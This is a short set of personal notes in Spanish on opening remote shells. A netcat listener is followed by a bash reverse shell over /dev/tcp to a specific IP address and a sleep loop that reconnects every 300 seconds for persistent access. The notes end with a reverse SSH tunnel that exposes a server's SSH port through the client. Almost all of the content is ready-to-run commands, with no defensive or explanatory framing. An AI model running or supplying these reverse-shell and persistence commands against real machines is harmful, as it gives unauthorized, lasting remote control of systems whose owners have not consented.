En una máquina (cliente) abrimos un puerto con netcat:
nc -kl 3000


En la máquina (servidor) donde van a ser ejecutados los comandos
exec bash >& /dev/tcp/10.26.236.136/7337 0>&1
while sleep 300; do exec bash >& /dev/tcp/ip.address/port.number 0>&1; done


Cuando el cliente escriba comandos en su netcat, le contestará el bash del servidor


# Con tuneles ssh
En el servidor al que queremos acceder (abrimos en el cliente el puerto 2222):
ssh -f -R 2222:localhost:22 10.0.0.100 -N
En el cliente (el puerto 2222 está conectado al 22 del server)
ssh localhost -p 2222

